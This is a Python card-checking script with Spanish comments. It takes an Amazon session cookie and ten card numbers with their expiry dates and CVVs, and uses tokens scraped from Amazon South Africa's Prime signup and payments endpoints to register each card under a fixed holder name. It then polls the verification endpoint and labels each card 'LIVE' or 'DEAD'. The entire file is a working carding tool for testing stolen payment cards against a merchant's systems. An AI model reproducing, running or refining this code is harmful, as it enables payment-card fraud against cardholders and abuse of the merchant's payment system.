import requests
import re
import json
import time
import uuid
import random
import string

# 1. Pedir cookie por consola
cookie_input = input("Por favor, introduce tu cookie de Amazon: ")

# 2. Pedir las 10 tarjetas por consola
print("\nIntroduce los datos de 10 tarjetas (una por línea en formato: numero|mes|año|cvv):")
card_lines = []
for i in range(10):
    card_line = input(f"Tarjeta {i+1}: ").strip()
    card_lines.append(card_line)

# 3. Procesar cada tarjeta
for card_index, card_data in enumerate(card_lines):
    print(f"\n{'='*60}")
    print(f"PROCESANDO TARJETA #{card_index+1}")
    print(f"{'='*60}")
    
    # Validar y procesar los datos de la tarjeta
    card_parts = card_data.split('|')
    if len(card_parts) != 4:
        print(f"Error: Formato incorrecto para tarjeta #{card_index+1}. Debe ser: numero|mes|año|cvv")
        print("❌ LA TARJETA ES DEAD (formato inválido)")
        continue

    card_number, month, year, cvv = card_parts

    # Validar que el mes tenga 2 dígitos y el año tenga 4 dígitos
    if len(month) != 2 or len(year) != 4:
        print(f"Error: El mes debe tener 2 dígitos y el año debe tener 4 dígitos para tarjeta #{card_index+1}")
        print("❌ LA TARJETA ES DEAD (formato inválido)")
        continue

    # Convertir mes y año a enteros para el payload
    try:
        month_int = int(month)
        year_int = int(year)
    except ValueError:
        print(f"Error: El mes y el año deben ser números para tarjeta #{card_index+1}")
        print("❌ LA TARJETA ES DEAD (formato inválido)")
        continue

    print(f"\nVerificando tarjeta: ****-****-****-{card_number[-4:]}")

    # 4. URL inicial
    url = "https://www.amazon.co.za/gp/prime/pipeline/membersignup?campaignId=SlashPrime&offerToken=amzn1.prime.offertoken.1.1TkhubSeqKMaP6sP46NLeSabLwSy1ZscXzcfj9vj6yHgqazX_v_YWCTUqf91wIkg_w0eFDgKxBPyoCEMqNxODsOmtORHpqlWWgr-shxRmfqBa-N2LwS4xYA4eAq6Yk22xajsXYkSlYbl_vMiMZsxRHuBafgjnRCK16tiTodkSf9k6Vq_UYq8g-hlBiXy5qhRbEswA_wDvYgP_TVeX9AfMdf-BALq9RBb4i6J4s038-qLAWCwegFGv9UFR1yvNhcbr_SVpw35kyXfT7zxYv-UNdLhEGFDZkpneuMmAQLiW3hOx9I34gLW-p5q4DdOf7qUMockx6agrdzwF1sbrnY2q9fhYfe08JrUnEI&redirectURL=L2dwL3ByaW1l&locationID=prime_confirm&cancelRedirectURL=Lw&containerRequestId=e2f8e65b-fcdf-4d46-9d83-a4662d1de7c2_ddc58bde-d4a7-416f-a65b-33e0cc18825c&originalContainerRequestId=e2f8e65b-fcdf-4d46-9d83-a4662d1de7c2_ddc58bde-d4a7-416f-a65b-33e0cc18825c&primeSignupFulfillmentType=AMAZON_WALLET"

    # 5. Ajustar headers
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': cookie_input,
        'device-memory': '8',
        'downlink': '10',
        'dpr': '1',
        'ect': '4g',
        'priority': 'u=0, i',
        'referer': 'https://www.amazon.co.za/prime?ref_=nav_cs_primelink_nonmember',
        'rtt': '50',
        'sec-ch-device-memory': '8',
        'sec-ch-dpr': '1',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Google Chrome";v="151.0.7922.174", "Chromium";v="151.0.7922.174"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '19.0.0',
        'sec-ch-viewport-width': '964',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
        'viewport-width': '964'
    }

    # 6. Enviar la solicitud GET para obtener tokens
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error en la solicitud inicial para tarjeta #{card_index+1}: {e}")
        print("❌ LA TARJETA ES DEAD (error de conexión)")
        continue

    # Guardar response en un archivo HTML para depuración si es necesario
    with open(f'response_{card_index}.html', 'w', encoding='utf-8') as f:
        f.write(response.text)

    # 7. Ubicar el primer y tercer token en el archivo HTML
    token_pattern = r'{&amp;quot;token&amp;quot;:&amp;quot;(.*?)&'
    token_matches = re.findall(token_pattern, response.text)

    if len(token_matches) >= 2:
        # Primer token (x-amzn-upx-token)
        x_amzn_upx_token = token_matches[0]
        
        # Tercer token (csm-Authorization) - usa el mismo patrón pero es el segundo token encontrado
        csm_authorization = token_matches[1]
    else:
        print(f"\nNo se encontraron suficientes tokens en la respuesta para tarjeta #{card_index+1}.")
        print("❌ LA TARJETA ES DEAD (tokens no encontrados)")
        continue

    # 8. Ubicar el segundo token en el archivo HTML
    slate_token_pattern = r'&amp;quot;slateToken&amp;quot;:&amp;quot;(.*?)&'
    slate_token_match = re.search(slate_token_pattern, response.text)

    if slate_token_match:
        second_token = slate_token_match.group(1)
    else:
        print(f"\nNo se encontró el segundo token en la respuesta para tarjeta #{card_index+1}.")
        print("❌ LA TARJETA ES DEAD (segundo token no encontrado)")
        continue

    # 9. Preparar la segunda solicitud con los tokens obtenidos
    url2 = "https://apx-security.amazon.co.za/payments-portal/data/iris/live/v1/ssr/register/pages/add-pm-page/start?isFormRequest=true"

    headers2 = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'connection': 'keep-alive',
        'content-type': 'text/plain',
        'cookie': cookie_input,
        'host': 'apx-security.amazon.co.za',
        'origin': 'https://www.amazon.co.za',
        'referer': 'https://www.amazon.co.za/',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36'
    }

    # Timestamp actual en milisegundos
    current_timestamp = str(int(time.time() * 1000))

    payload = {
        "formHeaders": {
            "x-amzn-upx-token": x_amzn_upx_token,
            "csm-Authorization": csm_authorization,
            "content-type": "application/json",
            "upx-start-timestamp": current_timestamp,
            "upx-start-timestamp-source": "UPXSelectAddNewPaymentMethodLink",
            "apx3-mobile-web-bottom-sheet-header": "t1",
            "x-upx-slate-token": second_token
        },
        "formData": {
            "type": "AddPaymentMethod",
            "locale": "en_ZA",
            "journeyTraceId": "",
            "requestTraceId": "",
            "surfaceInfo": {
                "clientApplicationType": "browser",
                "surfaceFeatures": [],
                "userAgent": "default",
                "surfaceType": "desktop",
                "widgetPlacementVariant": "Inline"
            },
            "destinationWindowOrigin": "https://www.amazon.co.za",
            "widgetData": {
                "experimentalAddPaymentMethodDeepLink": "",
                "paymentIntent": "RecurringPayment"
            },
            "customerId": "",
            "clientId": "",
            "marketplaceId": "",
            "apxClientId": "",
            "temporaryCallerType": "UPXSelect"
        }
    }

    # 10. Realizar la segunda solicitud POST
    try:
        response2 = requests.post(url2, headers=headers2, data=f"data={json.dumps(payload)}")
        response2.raise_for_status()
    except requests.RequestException as e:
        print(f"Error en la segunda solicitud para tarjeta #{card_index+1}: {e}")
        print("❌ LA TARJETA ES DEAD (error de conexión)")
        continue

    # Guardar la segunda respuesta para depuración
    with open(f'response2_{card_index}.html', 'w', encoding='utf-8') as f:
        f.write(response2.text)

    # 11. Extraer los nuevos datos de la segunda respuesta
    # Extraer privateStateId
    private_state_id_pattern = r'privateStateId":"(.*?)"'
    private_state_id_match = re.search(private_state_id_pattern, response2.text)

    if private_state_id_match:
        private_state_id = private_state_id_match.group(1)
    else:
        print(f"No se encontró privateStateId en la respuesta para tarjeta #{card_index+1}.")
        print("❌ LA TARJETA ES DEAD (privateStateId no encontrado)")
        continue

    # Extraer applicationInstanceTraceId
    app_instance_trace_id_pattern = r'applicationInstanceTraceId":"(.*?)"'
    app_instance_trace_id_match = re.search(app_instance_trace_id_pattern, response2.text)

    if app_instance_trace_id_match:
        app_instance_trace_id = app_instance_trace_id_match.group(1)
    else:
        print(f"No se encontró applicationInstanceTraceId en la respuesta para tarjeta #{card_index+1}.")
        print("❌ LA TARJETA ES DEAD (applicationInstanceTraceId no encontrado)")
        continue

    # 12. Preparar la tercera solicitud para registrar el método de pago
    url3 = "https://apx-security.amazon.co.za/payments-portal/data/iris/live/v1/data/register/set-registration?sif_profile=APX3-Encryption-eu-eu-west-1"

    headers3 = {
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'connection': 'keep-alive',
        'content-type': 'application/json',
        'cookie': cookie_input,
        'host': 'apx-security.amazon.co.za',
        'origin': 'https://apx-security.amazon.co.za',
        'referer': 'https://apx-security.amazon.co.za/payments-portal/data/iris/live/v1/ssr/register/pages/add-pm-page/start?isFormRequest=true',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
        'x-amzn-upx-token': x_amzn_upx_token,
        'x-upx-slate-token': second_token
    }

    # Generar un nuevo requestTraceId con formato: Rmtbx6tpy-(aleatorio)
    def generate_request_trace_id():
        prefix = "Rmtbx6tpy-"
        # Generar una cadena aleatoria de 12 caracteres
        random_part = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
        return prefix + random_part

    request_trace_id = generate_request_trace_id()

    # Payload para la tercera solicitud con los datos de la tarjeta
    payload3 = {
        "type": "RegisterPaymentMethod",
        "applicationInstanceTraceId": app_instance_trace_id,
        "journeyTraceId": "",
        "locale": "en_ZA",
        "paymentIntent": "RecurringPayment",
        "paymentMethodRegistrationInfo": {
            "accountHolderName": "OLIMPO MEDINA",
            "category": "Card",
            "encryptedCardNumber": card_number,
            "encryptedCardSecurityCode": cvv,
            "expirationDate": {
                "month": month_int,
                "year": year_int
            },
            "paymentMethodType": "Card"
        },
        "privateStateId": private_state_id,
        "requestTraceId": request_trace_id,
        "surfaceInfo": {
            "clientApplicationType": "browser",
            "surfaceFeatures": [],
            "userAgent": "default",
            "widgetPlacementVariant": "Inline",
            "surfaceType": "desktop"
        },
        "widgetName": "AddPaymentMethod"
    }

    # 13. Realizar la tercera solicitud POST
    try:
        response3 = requests.post(url3, headers=headers3, data=json.dumps(payload3))
        response3.raise_for_status()
    except requests.RequestException as e:
        print(f"Error en la tercera solicitud para tarjeta #{card_index+1}: {e}")
        print("❌ LA TARJETA ES DEAD (error de conexión)")
        continue

    # Guardar la tercera respuesta para depuración
    with open(f'response3_{card_index}.html', 'w', encoding='utf-8') as f:
        f.write(response3.text)

    # 14. Extraer verificationId de la tercera respuesta
    verification_id_pattern = r'\{"verificationId":"(.*?)"'
    verification_id_match = re.search(verification_id_pattern, response3.text)

    if verification_id_match:
        verification_id = verification_id_match.group(1)
    else:
        print(f"No se encontró verificationId en la respuesta para tarjeta #{card_index+1}.")
        print("❌ LA TARJETA ES DEAD (verificationId no encontrado)")
        continue

    # 15. Preparar las 4 solicitudes get-verification
    print("\nIniciando el proceso de verificación con 4 intentos...")

    url4 = "https://apx-security.amazon.co.za/payments-portal/data/iris/live/v1/data/register/get-verification"

    # Headers para las solicitudes get-verification
    headers4 = {
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'connection': 'keep-alive',
        'content-type': 'application/json',
        'cookie': cookie_input,
        'host': 'apx-security.amazon.co.za',
        'origin': 'https://apx-security.amazon.co.za',
        'referer': 'https://apx-security.amazon.co.za/payments-portal/data/iris/live/v1/ssr/register/pages/add-pm-page/start?isFormRequest=true',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
        'x-amzn-upx-token': x_amzn_upx_token,
        'x-upx-slate-token': second_token
    }

    # Generar una nueva queryId
    query_id = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(64))

    # Variable para almacenar el estado final de la verificación
    final_verification_status = None
    card_is_live = False

    # Realizar 4 solicitudes get-verification con attemptNumber de 0 a 3
    for attempt in range(4):
        # Generar un nuevo requestTraceId para cada intento
        new_request_trace_id = generate_request_trace_id()
        
        # Payload para la solicitud get-verification
        payload4 = {
            "type": "GetVerificationStatus",
            "application": "Register",
            "applicationInstanceTraceId": app_instance_trace_id,
            "attemptNumber": attempt,
            "journeyTraceId": "",
            "queryId": query_id,
            "locale": "en_ZA",
            "requestTraceId": new_request_trace_id,
            "surfaceInfo": {
                "clientApplicationType": "browser",
                "surfaceFeatures": [],
                "userAgent": "default",
                "surfaceType": "desktop",
                "widgetPlacementVariant": "Inline"
            },
            "verificationId": verification_id,
            "widgetName": "AddPaymentMethod"
        }
        
        print(f"\nEnviando solicitud de verificación #{attempt+1} (attemptNumber: {attempt})...")
        
        # Realizar la solicitud POST
        try:
            response4 = requests.post(url4, headers=headers4, data=json.dumps(payload4))
            response4.raise_for_status()
        except requests.RequestException as e:
            print(f"Error en la solicitud de verificación #{attempt+1}: {e}")
            continue
        
        # Imprimir el resultado
        print(f"Código de estado: {response4.status_code}")
        print(f"Respuesta del intento #{attempt+1}:")
        print(response4.text)
        
        # Guardar la respuesta en un archivo
        with open(f'verification_response_{card_index}_{attempt}.html', 'w', encoding='utf-8') as f:
            f.write(response4.text)
        
        # Extraer el estado de la verificación para verificar si la tarjeta es LIVE o DEAD
        try:
            verification_response = json.loads(response4.text)
            verification_status = None
            failure_code = None
            response_code = verification_response.get("responseCode", "unknown")
            
            # Verificar si hay un estado de verificación explícito
            if "verificationStatus" in verification_response:
                verification_status = verification_response.get("verificationStatus")
            # Si no, verificar el responseCode
            elif response_code == "success":
                verification_status = "Success"
            else:
                # Intentar obtener el failureCode si existe
                failure_code = verification_response.get("failureCode", "")
                # Revisar diferentes códigos de error que indican tarjeta muerta
                if failure_code in ["BAD_INPUT", "Declined", "Failed", "SoftDeclined"]:
                    verification_status = "Declined"
            
            # Almacenar la última respuesta para verificar el estado final
            final_verification_status = verification_status
            
            # Ya encontramos el estado final, imprimir mensaje de estado de la tarjeta
            if verification_status == "Success":
                print("\n✅ LA TARJETA ES LIVE AUTH APPROVED")
                card_is_live = True
            elif verification_status in ["Declined", "Failed"]:
                print("\n❌ LA TARJETA ES DEAD")
            elif failure_code == "BAD_INPUT":
                print("\n❌ LA TARJETA ES DEAD (BAD_INPUT)")
            else:
                print(f"\n⏳ Estado de verificación: {verification_status}")
        except json.JSONDecodeError:
            print("\nNo se pudo decodificar la respuesta JSON")
        
        # Si no es el último intento, esperar 2 segundos antes de continuar
        if attempt < 3:
            print("Esperando 2 segundos antes del siguiente intento...")
            time.sleep(2)

    # Verificación final del estado de la tarjeta
    if card_is_live or final_verification_status == "Success":
        print(f"\n🎉 RESULTADO FINAL TARJETA #{card_index+1}: LA TARJETA ES LIVE AUTH APPROVED ✅")
    elif final_verification_status in ["Declined", "Failed", "BAD_INPUT"]:
        print(f"\n💀 RESULTADO FINAL TARJETA #{card_index+1}: LA TARJETA ES DEAD ❌")
    else:
        print(f"\n❓ RESULTADO FINAL TARJETA #{card_index+1}: Estado desconocido: {final_verification_status}")
    
    # Esperar un momento antes de procesar la siguiente tarjeta
    if card_index < 9:
        print("\nEsperando 3 segundos antes de procesar la siguiente tarjeta...")
        time.sleep(3)
    
print("\n" + "="*60)
print("PROCESO COMPLETADO: Se han verificado todas las tarjetas")
print("="*60)